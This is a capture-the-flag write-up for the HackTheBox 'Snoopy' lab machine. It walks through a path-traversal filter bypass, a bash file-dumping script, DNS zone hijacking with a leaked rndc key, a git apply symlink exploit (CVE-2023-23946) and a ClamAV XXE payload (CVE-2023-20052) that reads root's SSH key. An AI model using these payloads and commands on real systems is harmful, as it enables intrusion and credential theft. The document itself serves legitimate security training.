Attacking: snoopy.htb

Heading to http://snoopy.htb leads to a static site.

)

In the home page the first thing that cames to the attention is the download function. This allows to download a zip containing some press material of not interest; the most interesting thing is the download function itself. It seems to accept a "file parameter":

http://snoopy.htb/download?file=announcement.pdf

Let's try to perform some file inclusion:

> curl http://snoopy.htb/download?file=../../../../../etc/passwd
\<empty>

No response, maybe there'se some kind of escaping or blacklisting. In this case my approach is to start from what is already working (file=announcement.pdf) and try to understand what's happening out of my sight by applying some variation to the legitm parameter and doing some assumptions.

If the server is vulnerable to LFI, to exploit the vulnerability it's needed to / (or an equivalent representation, i.e url-ecode) to be interpreted; - announcement.pdf = ./announcement.pdf

Let's try this variation:

>curl -s 'http://snoopy.htb/download?file=./announcement.pdf' -o out.zip && unzip -l out.zip

Archive: out.zip
...
30732 2023-04-20 17:52 press_package/./announcement.pdf
...

It seems that the backend accept the "/" as well as the "."; but when trying:

>curl -s 'http://snoopy.htb/download?file=../press_package/announcement.pdf' -o out.zip \<empty>

Again no content, it seems that the "../" gets stripped from the input. Let's assume there's a replace for the "../" chars. It's possible to bypass this control by duplicating each char in the "../" string like this:

. . . . / /

The replace for the "../" will result into the following match:

. . . . / /

This is confirmed by running:

>curl -s 'http://snoopy.htb/download?file=....//....//....//....//....//....//....//etc/passwd' -o out.zip && unzip -l out.zip

Archive: out.zip
...
1805 2023-04-25 19:38 press_package/etc/passwd
...

  • [x] Local File Inclusion - Achieved

Having achieved the LFI, let's try to include something interesting but first, since the exfiltrated file gets zipped, I wrote a bash script to ease the files exfiltration phase.

#!/bin/bash

WORDLIST=$3

while read guess
do
    url="http://snoopy.htb/download.php?file=....//....//....//....//....//....//....//$guess" 
    echo -en "\033[2K\r$url"  
    content=$(wget -q --content-disposition $url && unzip -p press_release.zip 2>/dev/null)
    if [ -n "$content" ]
    then
        echo -e "\n\e[33m[$guess]: \n\e[32m$content\e[39m\n"
        mkdir -p "./dump/$(dirname $guess)"
        echo -e "$content" > ./dump/$guess
    fi
    rm press_release.zip
done < $WORDLIST

This script will try to include each guess from a wordlist and print the included file content to the standard output while dumping the file into a dump folder. I've used a seclist wordlist containing typical configuration files found in the /etc directory on linux systems.

[/etc/bind/named.conf]:

Three thing are to be pointed out from the "/etc/bind/named.conf.local" content, starting from the end (check there):
1. The allow-transfer {10.0.0.0/8;} directive is what allowed the AXFR transfer, being the attacker and the vitcim in that ip range
2. The allow-update { key "rndc-key"; } directive states says it's possible to perform some updates to the DNS records having the rndc-key
3. The "/var/lib/bind/db.snoopy.htb" contains the exactly transfered zone with the AXFR protocol.

The "rndc-key" is served on a platter in the "/etc/bind/named.conf"

  • Note: before running the script with this wordlist, I've performed some manual enumeration by including the nginx default sites configuration file to check for unreveiled virtual hosts or the /proc/self/environ - cmdline looking for sensitive informations, but not interesting was found.

Attacking: mm.snoopy.htb

The http://mm.snoopy.htb responds as a self-hosted Mattermost instance, a collaborative tool used by techicals.

Knowing some of the SnoopySec team emails and having the ability to alter the DNS zone, let's try impersonate the mail server in order to request a password reset and perform some account takeover.

To impersonate the mail server I've used the fakemail tool:

> sudo fakemail --bind 10.10.14.213:25 --stdout

The tool will listen on port 25 an print on the standard output any smtp request.

Let's create the malicious DNS A record by remotely updating the dns zone with nsupdate:

> nsupdate -y "hmac-sha256:rndc-key:BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA="
> server 10.10.11.212
> update add mail.snoopy.htb 86400 A 10.10.14.213
> send

Confirming the dns record is correctly set:

> dig mail.snoopy.htb @10.10.11.212 +short
10.10.14.213

Lateral Movement: "git apply" exploit

Having accessed the machine with the cbrown user, let's what can this user do.

> sudo -l
[sudo] password for cbrown:

User cbrown may run the following commands on snoopy:
  (sbrown) PASSWD: /usr/bin/git ^apply -v [a-zA-Z0-9.]+$

It seems that cbrown can run the git apply command as sbrown. Moreover, the git apply is required to have the -v flag and the parameter must match the regex.

Let's collect more information to understand if it's possibile to abuse the "git apply" command.

Get git version:

> git --version
git version 2.34.1

What does the git apply command with the man command (runned on local machine since the box has no man-db installed):

> man git
...
    git‐apply(1)
      Apply a patch to files and/or to the index.

It seems that with this command is possible to apply a patch which means that potentially the attacker is able to perform some writes as sbrown in git repositories but, after some exploration, no abusable sbrown files are found.
The next step is to understand if there's any known vulnerability for this git version. After a quick search on google, a suitable CVE was found:

  • CVE-2023-23946

This states, even though not very clearly, that a symlink could possibly be used to overwrite a path outside the working tree. A POC can be found here

I've targeted the authorized_keys file into /home/sbrown.ssh folder, assuming it exists:

> ln -s /home/sbrown/.ssh symlink

Then, I've created the patch file containing the attacker public ssh key:

Privilege Escalation

Now it's time to get root access. The user sbrown has the following sudo privileges:

> sudo -l
User sbrown may run the following commands on snoopy:
&nsbp&nbps(root) NOPASSWD: /usr/local/bin/clamscan ^--debug /home/sbrown/scanfiles/[a-zA-Z0-9.]+$

Let's collect more informations like the ClaimAV version:

> clamscan --version
ClamAV 1.0.0/26853/Fri Mar 24 07:24:11 2023

It seems that this ClamAV version has a known vulnerability CVE-2023-20052. By forging a malicious DMG file, an XXE vulnerability into the parser allows to leak informations. Being able to run this command as root we could try to exiltrate the root ssh private key, assuming the key exists as /root/.ssh/id_rsa. A POC for this vulnerability shown here

> genisoimage -D -V "exploit" -no-pad -r -apple -file-mode 0777 -o test.img . && dmg dmg test.img test.dmg
> bbe -e 's|\<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">|\<!DOCTYPE plist [\<!ENTITY xxe SYSTEM "/root/.ssh/id_rsa"> ]>|' -e 's/blkx/&xxe\;/' test.dmg -o exploit.dmg

Move the malicious dmg to the server:

> scp -i id_rsa CVE-2023-20052/exploit.dmg sbrown@10.10.11.212:/home/sbrown/scanfiles

Now it's time to run the scan with sudo privileges:

> sudo /usr/local/bin/clamscan --debug /home/sbrown/scanfiles/exploit.dmg
